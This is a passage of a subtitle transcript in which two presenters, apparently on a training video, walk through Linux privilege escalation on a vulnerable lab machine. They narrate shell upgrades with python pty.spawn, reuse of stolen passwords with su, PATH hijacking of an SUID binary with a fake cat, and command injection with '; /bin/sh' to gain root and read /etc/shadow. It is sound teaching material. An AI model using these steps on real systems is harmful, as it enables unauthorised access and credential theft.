right?\n\n96\n00:05:05.830 --> 00:05:07.390\nGotta love that.\n\n97\n00:05:07.390 --> 00:05:08.740\nSo let's do this.\n\n98\n00:05:08.740 --> 00:05:12.828\nJust do python-c, and\n\n99\n00:05:12.828 --> 00:05:17.966\nthen give the single quote import pty.\n\n100\n00:05:17.966 --> 00:05:20.639\nPty, hello.\n\n101\n00:05:20.639 --> 00:05:27.290\nPty, then a ; then pty.spawn.\n\n102\n00:05:27.290 --> 00:05:30.825\nA-W-N, like that.\n\n103\n00:05:30.825 --> 00:05:35.773\nOpen parentheses then do\n\n104\n00:05:35.773 --> 00:05:40.930\n(\"/bin/bash\").\n\n105\n00:05:40.930 --> 00:05:41.570\nCuz remember,\n\n106\n00:05:41.570 --> 00:05:46.260\nwe started with a single parentheses,\nwe gotta end with a single parentheses.\n\n107\n00:05:47.970 --> 00:05:51.770\nWe hit Enter, and\nnow my prompt has changed.\n\n108\n00:05:51.770 --> 00:05:53.670\nBecause now I'm in a Bash environment.\n\n109\n00:05:53.670 --> 00:05:55.340\nI'm no longer in a Shell environment.\n\n110\n00:05:55.340 --> 00:05:59.280\nSo now I should have some more\nfunctionality, more features.\n\n111\n00:05:59.280 --> 00:06:01.900\nSo let's see if su will work for us.\n\n112\n00:06:01.900 --> 00:06:03.290\nSu, and we'll say Kent.\n\n113\n00:06:03.290 --> 00:06:06.960\nSo it's asking for Kent's password.\n\n114\n00:06:06.960 --> 00:06:10.320\nWell, luckily I made a list of those\nlovely little passwords that we,\n\n115\n00:06:11.550 --> 00:06:12.840\nremember we had to run through.\n\n116\n00:06:12.840 --> 00:06:14.760\nThey were base 64 encoded.\n\n117\n00:06:14.760 --> 00:06:17.070\nSo let me do an ls down here.\n\n118\n00:06:17.070 --> 00:06:19.336\nI think they were under mysql_users.\n\n119\n00:06:19.336 --> 00:06:21.830\nmysql_users, yeah, there they are.\n\n120\n00:06:25.410 --> 00:06:30.210\nDo a copy and just paste it into there,\nhit enter and\n\n121\n00:06:30.210 --> 00:06:36.080\nnow you'll notice I went\nfrom being www.data to kent,\n\n122\n00:06:36.080 --> 00:06:40.670\nso we're already actually moving\nalong really quickly right?\n\n123\n00:06:40.670 --> 00:06:45.670\nWe've moved from one user into another\nthrough some stolen credentials.\n\n124\n00:06:45.670 --> 00:06:47.880\nSo I mean that's obviously\nprivilege escalation right there.\n\n125\n00:06:47.880 --> 00:06:48.590\n&gt;&gt; Absolutely.\n\n126\n00:06:48.590 --> 00:06:49.990\nYou might be moving horizontal, but\n\n127\n00:06:49.990 --> 00:06:51.450\nwho knows what we can do with kent-\n&gt;&gt; Right.\n\n128\n00:06:51.450 --> 00:06:53.340\n&gt;&gt; That we couldn't do with\nthe one we were currently on.\n\n129\n00:06:53.340 --> 00:06:54.880\nSo it's definitely a good step.\n\n130\n00:06:54.880 --> 00:06:56.860\n&gt;&gt; And that, Mike,\nmakes the perfect point,\n\n131\n00:06:56.860 --> 00:07:00.580\nis that just because you're logged in\nas one user and you can't do such and\n\n132\n00:07:00.580 --> 00:07:05.080\nsuch, if you are able to change\nto other users, maybe they can.\n\n133\n00:07:05.080 --> 00:07:07.150\nSo always try these things.\n\n134\n00:07:07.150 --> 00:07:12.080\nIt's all about exploration, finding\nthe systems, what they can and can not do,\n\n135\n00:07:12.080 --> 00:07:14.300\nand what can you make them do.\n\n136\n00:07:14.300 --> 00:07:18.000\nSo now we're logged in as Kent\nwe should be able do a ls.\n\n137\n00:07:18.000 --> 00:07:20.580\nWhich we can, and\nwe can say CD enter Kent.\n\n138\n00:07:21.840 --> 00:07:25.110\nAnd we'll do an ls.\n\n139\n00:07:25.110 --> 00:07:28.690\nI'll just make sure that\nhe has no hidden files.\n\n140\n00:07:28.690 --> 00:07:32.390\nNope, just standard bash_history,\nbash_logout, bashrc.\n\n141\n00:07:32.390 --> 00:07:33.880\nNothing fancy going on here.\n\n142\n00:07:33.880 --> 00:07:38.830\nSo Kent was a big bust when\nit comes to that kinda stuff,\n\n143\n00:07:38.830 --> 00:07:40.820\nat least as far as we've gotten.\n\n144\n00:07:40.820 --> 00:07:42.760\nLet's jump on and look at the other guys.\n\n145\n00:07:42.760 --> 00:07:44.810\nSee maybe they have something going on.\n\n146\n00:07:46.610 --> 00:07:47.310\nLet's see here.\n\n147\n00:07:47.310 --> 00:07:48.870\nWho else do we have?\n\n148\n00:07:48.870 --> 00:07:50.950\nLet's see here.\n\n149\n00:07:50.950 --> 00:07:53.160\nBack it out here and\ngive me that list of guys.\n\n150\n00:07:53.160 --> 00:07:54.780\nI've got a list of them right here.\n\n151\n00:07:54.780 --> 00:07:56.112\nI'm overlooking everything.\n\n152\n00:07:56.112 --> 00:07:57.284\nThat's nice.\n\n153\n00:07:57.284 --> 00:08:00.290\nLet's try Let's try Mike.\n\n154\n00:08:00.290 --> 00:08:00.908\nMike's sitting right here.\n\n155\n00:08:00.908 --> 00:08:04.190\n[CROSSTALK] [LAUGH]\n&gt;&gt; Shady characters, right?\n\n156\n00:08:04.190 --> 00:08:09.555\nAll right, let's su to Mike and\nget his password.\n\n157\n00:08:13.383 --> 00:08:16.078\nCopy and paste.\n\n158\n00:08:20.503 --> 00:08:23.154\nAuthentication failure, interesting.\n\n159\n00:08:23.154 --> 00:08:24.360\nVery, very interesting.\n\n160\n00:08:25.590 --> 00:08:29.121\nSo, maybe that's his password for\nlogging into the web server.\n\n161\n00:08:29.121 --> 00:08:31.825\nMaybe it's not his password for\nlogging into here.\n\n162\n00:08:31.825 --> 00:08:34.310\n&gt;&gt; Or he changed his password\nsince we obtained them?\n\n163\n00:08:34.310 --> 00:08:35.510\n&gt;&gt; Could be, let's see here.\n\n164\n00:08:35.510 --> 00:08:36.793\nWhat else do we wanna do here?\n\n165\n00:08:38.739 --> 00:08:41.540\n&gt;&gt; Let's try Keane, we got Keane.\n\n166\n00:08:41.540 --> 00:08:44.200\nThat's our last user that\nI have a password for.\n\n167\n00:08:44.200 --> 00:08:46.120\nSo, I'm kinda running out of options here.\n\n168\n00:08:46.120 --> 00:08:49.002\nSo let's see here, SU to Keane.\n\n169\n00:08:49.002 --> 00:08:57.180\nLet's copy his password,\nPaste it in return.\n\n170\n00:08:57.180 --> 00:08:58.259\nOkay, Keane's good.\n\n171\n00:08:58.259 --> 00:09:00.029\nWe got logged as him.\n\n172\n00:09:00.029 --> 00:09:01.272\nThat's excellent.\n\n173\n00:09:01.272 --> 00:09:05.121\nDo an ls, cd into Keane, do an ls.\n\n174\n00:09:05.121 --> 00:09:07.350\nI just got some files here.\n\n175\n00:09:07.350 --> 00:09:11.420\nThat's interesting, he has cats in here.\n\n176\n00:09:11.420 --> 00:09:12.820\nls is not a part of the file system.\n\n177\n00:09:12.820 --> 00:09:17.340\nIt's just kind of basically\nreiterating what commands I've sent.\n\n178\n00:09:17.340 --> 00:09:22.084\nSo it's just a quirk of working in\nthe environment that we're working in.\n\n179\n00:09:22.084 --> 00:09:26.251\nLet's do an ls-al just to make\nsure that everything looks good.\n\n180\n00:09:26.251 --> 00:09:27.210\nSo this is interesting.\n\n181\n00:09:27.210 --> 00:09:27.990\nSo he's got CAT.\n\n182\n00:09:27.990 --> 00:09:31.430\nCAT is a command in Linux to concatenate.\n\n183\n00:09:31.430 --> 00:09:34.200\nBasically, show me what's inside\nof this file is what it does.\n\n184\n00:09:34.200 --> 00:09:39.605\nBut his is saying he's\nrunning as Keane here, right?\n\n185\n00:09:39.605 --> 00:09:43.230\nRRWX-RD everybody's got full\ncontrol of this CAT file.\n\n186\n00:09:44.480 --> 00:09:46.726\nI know why cuz I created it.\n\n187\n00:09:46.726 --> 00:09:51.591\nAnd for good reasons because if you look\n\n188\n00:09:51.591 --> 00:09:55.724\ndown here, we got this msg mike.\n\n189\n00:09:55.724 --> 00:09:57.893\nAnd look who's running.\n\n190\n00:09:57.893 --> 00:10:00.670\nWho's the owner, who's the group owner?\n\n191\n00:10:00.670 --> 00:10:03.216\nAnd you see this little s right here?\n\n192\n00:10:03.216 --> 00:10:07.920\nThat's not the r,\nthat's a little too much.\n\n193\n00:10:07.920 --> 00:10:09.703\nBut that's the SUID.\n\n194\n00:10:09.703 --> 00:10:14.269\nThat's a bit you set when\nyou set permissions to allow\n\n195\n00:10:14.269 --> 00:10:17.830\nthings to be run as other users.\n\n196\n00:10:17.830 --> 00:10:22.513\nSo this is a file that Mike owns.\n\n197\n00:10:22.513 --> 00:10:24.647\nHe's the owner of it and\nhe's the group owner of it.\n\n198\n00:10:24.647 --> 00:10:26.910\nAnd he's allowing other\npeople to execute it.\n\n199\n00:10:26.910 --> 00:10:28.989\nCuz you'll notice you got the rx here.\n\n200\n00:10:28.989 --> 00:10:30.660\nBut it's running as himself.\n\n201\n00:10:31.680 --> 00:10:34.300\nThat's what that S is for, the SUID.\n\n202\n00:10:34.300 --> 00:10:39.640\nSo any user, cuz that's what we see here,\nhas read and\n\n203\n00:10:39.640 --> 00:10:44.490\nexecute, but when that executes,\nit runs as Mike.\n\n204\n00:10:45.590 --> 00:10:46.970\nPrivilege escalation anyone?\n\n205\n00:10:46.970 --> 00:10:48.560\nThat's what we're looking for, okay?\n\n206\n00:10:49.830 --> 00:10:51.400\nSo let's see here.\n\n207\n00:10:51.400 --> 00:10:53.240\nLet's actually run the file and\nsee what it does.\n\n208\n00:10:54.850 --> 00:10:57.031\nI might actually have to remove that cat.\n\n209\n00:10:57.031 --> 00:10:58.666\nLet me rename that here.\n\n210\n00:10:58.666 --> 00:11:00.284\nSo I'll copy cat.\n\n211\n00:11:00.284 --> 00:11:04.628\nWe'll call it cat2, and then we'll rm cat.\n\n212\n00:11:07.210 --> 00:11:10.694\nLet's do this ./msgmike.\n\n213\n00:11:12.320 --> 00:11:16.360\nAnd it's running, and it calls cat.\n\n214\n00:11:16.360 --> 00:11:19.550\nSo now you're probably saying\nagain I Tarantino-ed it for\n\n215\n00:11:19.550 --> 00:11:22.730\nyou, gave you a little\npreview of what's to come.\n\n216\n00:11:22.730 --> 00:11:24.510\nAnd then we go back and\nwe see what's going on.\n\n217\n00:11:24.510 --> 00:11:27.808\nSo this script,\nit's basically a script, right?\n\n218\n00:11:27.808 --> 00:11:30.897\nObviously, because there's the thing.\n\n219\n00:11:30.897 --> 00:11:37.645\nWe can cat that, cat msgmike, man,\nit's just a whole bunch of craziness.\n\n220\n00:11:37.645 --> 00:11:43.155\nSo it's a script that is not a bad script,\nit's something else.\n\n221\n00:11:43.155 --> 00:11:46.381\nWe can do things like\nrun strings at it maybe.\n\n222\n00:11:46.381 --> 00:11:52.308\nSo like string strings, look for\nstrings inside it, msgmike and\n\n223\n00:11:52.308 --> 00:11:58.129\njust look through there and\nsee if anything looks interesting,\n\n224\n00:11:58.129 --> 00:12:02.686\nuser names, passwords,\nthings of that nature.\n\n225\n00:12:02.686 --> 00:12:06.814\nA lot of information there but\n\n226\n00:12:06.814 --> 00:12:11.610\nnothing crazy, except for this.\n\n227\n00:12:12.880 --> 00:12:13.555\nLook at that.\n\n228\n00:12:13.555 --> 00:12:17.084\nSo it's calling cat to look\nat a file home Mike, so\n\n229\n00:12:17.084 --> 00:12:20.120\nit's looking in Mike's home directory.\n\n230\n00:12:20.120 --> 00:12:21.250\nThat's why it needs to run as Mike.\n\n231\n00:12:21.250 --> 00:12:23.960\nThat's why that SUID bit has been set.\n\n232\n00:12:23.960 --> 00:12:29.220\nBecause it is looking at a file that,\nnormally, I wouldn't have permission to.\n\n233\n00:12:29.220 --> 00:12:32.360\nAnd it's message.text, all right?\n\n234\n00:12:32.360 --> 00:12:34.915\nSo it's catting that and then outputting.\n\n235\n00:12:34.915 --> 00:12:35.690\nSo let's run it again.\n\n236\n00:12:35.690 --> 00:12:41.210\nThat's msgmike and it's saying that\nthere is no such file or directory.\n\n237\n00:12:41.210 --> 00:12:44.950\nSo it's just saying that\nmsg.text is not there.\n\n238\n00:12:44.950 --> 00:12:49.267\nBut it tried to look at it and\nit ran as Mike to do so, okay?\n\n239\n00:12:49.267 --> 00:12:51.070\nVery interesting.\n\n240\n00:12:51.070 --> 00:12:54.980\nSo what happens, cuz you'll notice\nthere is no full path here.\n\n241\n00:12:54.980 --> 00:12:56.990\nIt just calls the cat command.\n\n242\n00:12:56.990 --> 00:12:59.299\nIt doesn't say /bin /cat.\n\n243\n00:12:59.299 --> 00:13:02.160\nIt says, cat.\n\n244\n00:13:02.160 --> 00:13:04.950\nWell now, you're starting to see.\n\n245\n00:13:04.950 --> 00:13:06.630\nI can create my own cat command.\n\n246\n00:13:06.630 --> 00:13:08.680\nLet's do that.\nLet's take a look at what I did.\n\n247\n00:13:08.680 --> 00:13:11.627\nCat cat2 [LAUGH] which is funny.\n\n248\n00:13:11.627 --> 00:13:14.162\nBut what is this doing?\n\n249\n00:13:14.162 --> 00:13:19.720\nI created a shell script that does what?\n\n250\n00:13:19.720 --> 00:13:20.500\nGives me a shell.\n\n251\n00:13:20.500 --> 00:13:21.470\n&gt;&gt; Gives you a shell, yeah.\n\n252\n00:13:21.470 --> 00:13:23.280\n&gt;&gt; And who's gonna run that shell?\n\n253\n00:13:23.280 --> 00:13:24.523\nWho's gonna spawn that shell?\n\n254\n00:13:24.523 --> 00:13:26.210\n&gt;&gt; Looks like it's gonna run under Mike.\n\n255\n00:13:26.210 --> 00:13:26.850\n&gt;&gt; That's exactly right.\n\n256\n00:13:26.850 --> 00:13:27.840\n&gt;&gt; It's gonna run as Mike.\n\n257\n00:13:27.840 --> 00:13:32.490\nSo if I rename that file,\nif I copy cat2 and\n\n258\n00:13:34.050 --> 00:13:39.290\nI call it cats, there we go.\n\n259\n00:13:39.290 --> 00:13:40.570\nDo an ls, this should be cat.\n\n260\n00:13:40.570 --> 00:13:43.217\nI'll remove cat2.\n\n261\n00:13:43.217 --> 00:13:47.170\nThere we go,\nls now it's just cat and msgmike.\n\n262\n00:13:47.170 --> 00:13:51.106\nThere's our malicious CAT file,\n\n263\n00:13:51.106 --> 00:13:55.318\nour CAT program that spawns a shell.\n\n264\n00:13:55.318 --> 00:13:57.477\nBecause if I run CAT, what's gonna run?\n\n265\n00:13:57.477 --> 00:13:58.810\nBin CAT.\n\n266\n00:13:58.810 --> 00:13:59.570\nIt's gonna run.\n\n267\n00:13:59.570 --> 00:14:03.185\nI need to add it to the variable path,\nthe path, right?\n\n268\n00:14:03.185 --> 00:14:07.183\nIf you do echo path, that path variable,\n\n269\n00:14:07.183 --> 00:14:11.070\nanything inside of these directories,\n\n270\n00:14:11.070 --> 00:14:16.230\nyou don't have give the full directory,\nall right?\n\n271\n00:14:16.230 --> 00:14:19.815\nThat's why he can call cat and\nit works because that's in that path.\n\n272\n00:14:19.815 --> 00:14:23.434\nWhat we wanna do we wanna modify that path\nso it looks where we want it to look,\n\n273\n00:14:23.434 --> 00:14:26.220\nwhich is our Keane directory\ncuz that's where we're at.\n\n274\n00:14:27.260 --> 00:14:30.410\nSo I'm gonna copy this.\n\n275\n00:14:30.410 --> 00:14:33.380\nCopy this out here cuz I'm\ngonna wanna set it back.\n\n276\n00:14:34.500 --> 00:14:35.868\nCopy that.\n\n277\n00:14:35.868 --> 00:14:43.184\nAnd then I'm gonna say,\nPath equals, I'm just\n\n278\n00:14:43.184 --> 00:14:49.730\ngonna follow my nose cuz I don't wanna\nget lost on myself here, /home/keane.\n\n279\n00:14:49.730 --> 00:14:53.775\nSo now,\nwhen that cat program gets called off,\n\n280\n00:14:53.775 --> 00:14:57.830\nI just enter return and\nI do echo path like that.\n\n281\n00:14:57.830 --> 00:15:01.496\nYou'll notice, now it says home/kane and\nnot all these other,\n\n282\n00:15:01.496 --> 00:15:05.850\nuser games, user /local/games,\nbin, user /bin, user/local/bin.\n\n283\n00:15:05.850 --> 00:15:07.450\nThose aren't gonna be working.\n\n284\n00:15:07.450 --> 00:15:08.450\nIt's not looking there anymore.\n\n285\n00:15:08.450 --> 00:15:11.110\nIt's looking inside of kane's directory.\n\n286\n00:15:11.110 --> 00:15:11.710\nAnd that's my path.\n\n287\n00:15:11.710 --> 00:15:15.058\nSo when I now fire off,\n\n288\n00:15:15.058 --> 00:15:19.474\nthat's msgmike so msgmike.\n\n289\n00:15:19.474 --> 00:15:24.383\nYou'll notice that my prompt changed\nagain because Mike's user account fired\n\n290\n00:15:24.383 --> 00:15:29.140\noff a shell, which is just a little\ndollar sign and now what do we gotta do?\n\n291\n00:15:29.140 --> 00:15:33.250\nWell, we gotta spawn a bash shell yet\nagain.\n\n292\n00:15:33.250 --> 00:15:35.289\nBut first,\nwe gotta set our path back because-.\n\n293\n00:15:36.300 --> 00:15:41.540\n&gt;&gt; There are no other [LAUGH]\n[CROSSTALK] Yeah, there are no working\n\n294\n00:15:41.540 --> 00:15:47.250\nbinaries inside of the Keane directory so\nwe need to export path.\n\n295\n00:15:47.250 --> 00:15:50.089\nNo, we don't need path\njust say path equals.\n\n296\n00:15:50.089 --> 00:15:51.472\nI don't need to export it.\n\n297\n00:15:51.472 --> 00:15:56.542\nPath equals and then just paste\nthat in what it was before.\n\n298\n00:15:56.542 --> 00:15:57.304\nAnd there we go.\n\n299\n00:15:57.304 --> 00:16:02.256\nSo now we can echo $path,\nit should be back to that.\n\n300\n00:16:02.256 --> 00:16:04.620\nNow we can go back to using normal stuff.\n\n301\n00:16:06.270 --> 00:16:08.870\nSo that being said,\nlet's see here that's right,\n\n302\n00:16:08.870 --> 00:16:10.520\nwe need to spawn our batch shell again.\n\n303\n00:16:10.520 --> 00:16:12.890\nSo our good old python.\n\n304\n00:16:12.890 --> 00:16:18.961\nPython, not python,\n[LAUGH] that's strange.\n\n305\n00:16:18.961 --> 00:16:23.512\n-c, import, pTy, pTy, .spawn,\n\n306\n00:16:23.512 --> 00:16:29.069\nP-A-W, man my typing skills need dusting.\n\n307\n00:16:29.069 --> 00:16:34.270\nLet's see here, /bin/bash,\nand there we go.\n\n308\n00:16:34.270 --> 00:16:36.840\nThere we go.\nNow look at my prompt.\n\n309\n00:16:36.840 --> 00:16:37.510\n&gt;&gt; Wow.\n\n310\n00:16:37.510 --> 00:16:38.270\n&gt;&gt; Logged in as Mike.\n\n311\n00:16:38.270 --> 00:16:40.829\nSo now we've done another\nprivilege escalation, right?\n\n312\n00:16:40.829 --> 00:16:48.330\nSo we went from www-data to\nlogging in as Kent and Cain.\n\n313\n00:16:48.330 --> 00:16:50.860\nCain got us to where we\ncould log in as Mike.\n\n314\n00:16:52.050 --> 00:16:57.116\nWhat was so special about Mike that we\ncouldn't get at his home directory?\n\n315\n00:16:57.116 --> 00:16:58.174\nLet's jump in there and see.\n\n316\n00:16:58.174 --> 00:16:59.300\n&gt;&gt; No.\n&gt;&gt; Let's see here.\n\n317\n00:16:59.300 --> 00:17:00.256\n&gt;&gt; Cut the feed.\n\n318\n00:17:00.256 --> 00:17:00.968\n&gt;&gt; That's right.\n\n319\n00:17:00.968 --> 00:17:05.034\n[LAUGH] /home/mike Mike,\nwhat are you hiding here?\n\n320\n00:17:05.034 --> 00:17:07.080\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, so\n\n321\n00:17:07.080 --> 00:17:12.240\nMike has a file,\nalways check for hidden files.\n\n322\n00:17:12.240 --> 00:17:13.150\nNo hidden files there.\n\n323\n00:17:13.150 --> 00:17:19.100\nWe have this cool message to root again,\nlook at that.\n\n324\n00:17:19.100 --> 00:17:22.970\n&gt;&gt; SUID has been set yet again and\n\n325\n00:17:22.970 --> 00:17:28.220\nthis time look who\nthe owner of that file is.\n\n326\n00:17:28.220 --> 00:17:30.590\n&gt;&gt; So rinse and\nrepeat basically the same steps.\n\n327\n00:17:30.590 --> 00:17:35.070\nIt's what Kent had to get to Mike and\nnow Mike has it to get to root.\n\n328\n00:17:35.070 --> 00:17:36.600\n&gt;&gt; Right well it, we'll see.\n\n329\n00:17:36.600 --> 00:17:37.820\nWe don't know what this does.\n\n330\n00:17:37.820 --> 00:17:41.120\nLet's take a look at this\nmessage to root file.\n\n331\n00:17:41.120 --> 00:17:42.660\nMaybe that'll give us something here.\n\n332\n00:17:42.660 --> 00:17:45.950\nso we'll catmsg to root.\n\n333\n00:17:45.950 --> 00:17:49.140\nI can't use my tab\nautocomplete this terminal.\n\n334\n00:17:49.140 --> 00:17:50.940\nThere we go.\nAgain we're dealt with that.\n\n335\n00:17:52.380 --> 00:17:54.530\nWe got some good stuff\nout of strings before.\n\n336\n00:17:54.530 --> 00:17:55.298\nLet's try that.\n\n337\n00:18:00.159 --> 00:18:02.930\nStrings, msg, no,\nwas it message to root, right?\n\n338\n00:18:02.930 --> 00:18:05.440\nI can't remember the name of thing.\n\n339\n00:18:05.440 --> 00:18:05.940\nYeah.\n&gt;&gt; Msg to root.\n\n340\n00:18:05.940 --> 00:18:07.781\n&gt;&gt; Message to root, there we go.\n\n341\n00:18:07.781 --> 00:18:10.687\nSo strings,\n\n342\n00:18:10.687 --> 00:18:13.988\nmsg2root.\nAll right,\n\n343\n00:18:13.988 --> 00:18:15.920\nlet's look through it really quickly,\nsee if anything.\n\n344\n00:18:17.924 --> 00:18:19.295\nLooks awesome.\n\n345\n00:18:22.577 --> 00:18:25.310\nMoving through, nothing so far.\n\n346\n00:18:28.280 --> 00:18:29.280\nLot of stuff gone.\n\n347\n00:18:29.280 --> 00:18:32.670\nOkay, here we go,\ngot a little action here.\n\n348\n00:18:32.670 --> 00:18:33.974\nMessage for root.\n\n349\n00:18:33.974 --> 00:18:42.660\nBin echo percent s and then its\nappending a file root messages dot text.\n\n350\n00:18:42.660 --> 00:18:45.930\nAgain hence basically yeah,\nsame kind of problem that happened with\n\n351\n00:18:45.930 --> 00:18:51.120\nMike is happening here,\nis that they're calling echo.\n\n352\n00:18:51.120 --> 00:18:54.970\nThis time they're actually using a full\npath though, so we can't use the same,\n\n353\n00:18:54.970 --> 00:18:58.850\nwe'll just make our own echo command and\nmake it run.\n\n354\n00:18:58.850 --> 00:19:01.020\nIt's actually looking to bin echo, and\n\n355\n00:19:01.020 --> 00:19:06.180\nwe don't have the privileges to go into\nbin, delete echo, and create our own echo.\n\n356\n00:19:06.180 --> 00:19:08.820\nThat's under system authority, right?\n\n357\n00:19:08.820 --> 00:19:15.130\nSo that's not gonna be helpful,\nbut it is doing something with %s.\n\n358\n00:19:15.130 --> 00:19:16.990\nLet's run the file and\njust see what it does.\n\n359\n00:19:16.990 --> 00:19:19.490\nThat's probably a good spot at this point.\n\n360\n00:19:19.490 --> 00:19:24.480\nLet's see, msg to I can't do it.\n\n361\n00:19:24.480 --> 00:19:28.140\nWhat is it,\n\n362\n00:19:28.140 --> 00:19:32.171\nmsg2root.\n\n363\n00:19:32.171 --> 00:19:34.640\nSo it's taking user input.\n\n364\n00:19:34.640 --> 00:19:36.460\nI guess that's what that %s was for.\n\n365\n00:19:36.460 --> 00:19:39.500\nIt's looking for a variable.\n\n366\n00:19:39.500 --> 00:19:46.090\nSo okay, message for root,\nwe'll say hello root.\n\n367\n00:19:46.090 --> 00:19:47.441\nHello root, and there we go.\n\n368\n00:19:47.441 --> 00:19:52.553\nSo basically, and\nwe saw up above in our strings,\n\n369\n00:19:52.553 --> 00:19:57.710\nthat's getting saved\ninto rootmessages.txt.\n\n370\n00:19:57.710 --> 00:20:01.210\nSo root logs in, he checks messages\n.txt to see if there's anything there.\n\n371\n00:20:01.210 --> 00:20:04.360\nSo maybe Mike was,\nI'm having trouble uploading a file.\n\n372\n00:20:04.360 --> 00:20:05.840\nCan you check this out?\n\n373\n00:20:05.840 --> 00:20:07.300\nAnd you can do that message to root thing,\nand\n\n374\n00:20:07.300 --> 00:20:10.100\nit would save it in the directory,\nin that file.\n\n375\n00:20:10.100 --> 00:20:12.270\nOkay, that's moving us along.\n\n376\n00:20:13.800 --> 00:20:15.440\nSo that being said, where are we here?\n\n377\n00:20:15.440 --> 00:20:19.130\nI'm gonna make sure I'm\nfollowing my own notes here.\n\n378\n00:20:19.130 --> 00:20:21.820\nWe saw that the SU ID,\neverything is working great.\n\n379\n00:20:24.476 --> 00:20:29.360\nWhat I do think is happening\nhere is that this is probably.\n\n380\n00:20:29.360 --> 00:20:30.520\nBecause what is it doing?\n\n381\n00:20:30.520 --> 00:20:31.860\nIt's calling a command.\n\n382\n00:20:31.860 --> 00:20:34.130\n&gt;&gt; And it's writing to\na protected location, right?\n\n383\n00:20:34.130 --> 00:20:36.530\nOr at least a location that\nroot has permissions for.\n\n384\n00:20:36.530 --> 00:20:38.310\n&gt;&gt; That's very correct.\n\n385\n00:20:38.310 --> 00:20:39.725\nYou're getting a two-for-one sale here.\n\n386\n00:20:39.725 --> 00:20:41.400\n&gt;&gt; [LAUGH]\n&gt;&gt; We're not only gonna do privilege\n\n387\n00:20:41.400 --> 00:20:42.010\nescalation but\n\n388\n00:20:42.010 --> 00:20:45.330\nI'm gonna introduce you to a little\nsomething called command injection.\n\n389\n00:20:45.330 --> 00:20:45.930\nRight?\nBecause\n\n390\n00:20:45.930 --> 00:20:48.300\nwe have a command that is running, right?\n\n391\n00:20:48.300 --> 00:20:51.600\nAnd it's properly identified, but\n\n392\n00:20:51.600 --> 00:20:54.340\nI wonder if it's going to stop me\nfrom running multiple commands.\n\n393\n00:20:54.340 --> 00:20:58.100\nIf you don't know this about Linux, you\ncan string commands together on one line.\n\n394\n00:20:58.100 --> 00:21:01.960\nYou just use a semi-colon\nto delineate the commands.\n\n395\n00:21:01.960 --> 00:21:06.130\nSo I could write, cat,\nthen semi-colon, who am I?.\n\n396\n00:21:06.130 --> 00:21:11.050\nAnd it would CAT or if I CAT a file,\nsemicolon, who am I.\n\n397\n00:21:11.050 --> 00:21:13.900\nIt would CAT the file and\nthen show me the output of who I am.\n\n398\n00:21:15.090 --> 00:21:15.620\nPretty simple.\n\n399\n00:21:15.620 --> 00:21:17.310\nIt's a very easy thing to do.\n\n400\n00:21:17.310 --> 00:21:19.570\nThis looks ripe for that.\n\n401\n00:21:19.570 --> 00:21:20.430\nSo let's give it a whirl.\n\n402\n00:21:20.430 --> 00:21:21.900\nLet's see what happens.\n\n403\n00:21:21.900 --> 00:21:27.359\nSo what I'll do is I'll\nrun the message to root,\n\n404\n00:21:27.359 --> 00:21:30.697\nso I'll say ./msg2root.\n\n405\n00:21:30.697 --> 00:21:34.673\nIt asked me for a message to root,\n\n406\n00:21:34.673 --> 00:21:38.520\nI'm gonna say you been hacked.\n\n407\n00:21:38.520 --> 00:21:43.446\nSemicolon, and then let's,\nwhat should we do here?\n\n408\n00:21:43.446 --> 00:21:45.775\nHow about, I don't know, bin sh.\n\n409\n00:21:48.726 --> 00:21:51.030\nI don't know if you've seen\nmy proctor has changed.\n\n410\n00:21:51.030 --> 00:21:56.120\nBut in the Linux world,\nwhen you are the root user of a system,\n\n411\n00:21:56.120 --> 00:22:00.580\nyou get this little hashy sign, the pound\nsign whatever you like to call it.\n\n412\n00:22:00.580 --> 00:22:03.980\nAnd that let's you know, for your prompt,\nyou get that for your prompt.\n\n413\n00:22:03.980 --> 00:22:07.983\nYou'll notice right here, I have a #.\n\n414\n00:22:07.983 --> 00:22:11.800\nIf I say whoami, it tells me I am root.\n\n415\n00:22:12.830 --> 00:22:14.760\nI have successfully rooted this box.\n\n416\n00:22:14.760 --> 00:22:19.630\nAnd we can prove that by doing\nthings like cat/etc/shadow, yeah.\n\n417\n00:22:22.270 --> 00:22:26.590\nThere's all the passwords for the users on\nthis account, I can now download those to\n\n418\n00:22:26.590 --> 00:22:29.970\nmy machine, run my password cracker\non those if hadn't done that already.\n\n419\n00:22:29.970 --> 00:22:33.280\nOr maybe if there were users that\ndidn't get when we did the MySQL stuff,\n\n420\n00:22:33.280 --> 00:22:36.820\nback when we were using the LFI attack.\n\n421\n00:22:36.820 --> 00:22:40.570\nAll right, there could be other users\nthat I want, maybe the, I don't know.\n\n422\n00:22:40.570 --> 00:22:45.830\nThe root password would be nice to\nprobably run through my password cracker.\n\n423\n00:22:45.830 --> 00:22:49.040\nSee if I couldn't gather that, so that\nwe don't have to continually exploit it.\n\n424\n00:22:49.040 --> 00:22:52.240\nJust log in as root whenever\nI feel like it right?\n\n425\n00:22:52.240 --> 00:22:57.340\nAnd I think they actually put a cool\nflag here, so we'll go to roots, being\n\n426\n00:22:57.340 --> 00:23:00.360\nable to get into roots home directory,\nthat's a good sign that your root.\n\n427\n00:23:00.360 --> 00:23:02.048\nOr at least with the privileges to do so.\n\n428\n00:23:02.048 --> 00:23:06.731\nLS dash and there is a flag there,\nlook at that, they gave us a flag,\n\n429\n00:23:06.731 --> 00:23:08.061\nlet's check it out.\n\n430\n00:23:08.061 --> 00:23:13.679\nCat flag.txt, hey hey!\n\n431\n00:23:13.679 --> 00:23:18.513\nCongratulations, if you are reading\nthis is means we have break init Panlab,\n\n432\n00:23:18.513 --> 00:23:19.180\nawesome.\n\n433\n00:23:19.180 --> 00:23:22.095\nIt was a great challenge,\nI enjoyed doing this and\n\n434\n00:23:22.095 --> 00:23:26.191\nenjoyed showing it to you guys because\nit was a perfect explanation and\n\n435\n00:23:26.191 --> 00:23:30.844\nwalk through being able to let you guys\nsee what privilege escalation looks like\n\n436\n00:23:30.844 --> 00:23:35.081\nwhen you're not typically using\nsomething like remote code to do that or\n\n437\n00:23:35.081 --> 00:23:38.300\nlocal exploit that you found\non a database somewhere.\n\n438\n00:23:38.300 --> 00:23:41.640\n&gt;&gt; Fantastic, I don't think I could\nhave summed it up any better myself.\n\n439\n00:23:41.640 --> 00:23:42.770\nSo we appreciate that, Daniel.\n\n440\n00:23:42.770 --> 00:23:43.490\nGreat look there.\n\n441\n00:23:43.490 --> 00:23:47.500\nAgain, just to reiterate let me try\nto sum it up as well as Daniel did.\n\n442\n00:23:47.500 --> 00:23:51.299\nA really good look at how we escalate our\nprivileges in the Linux world 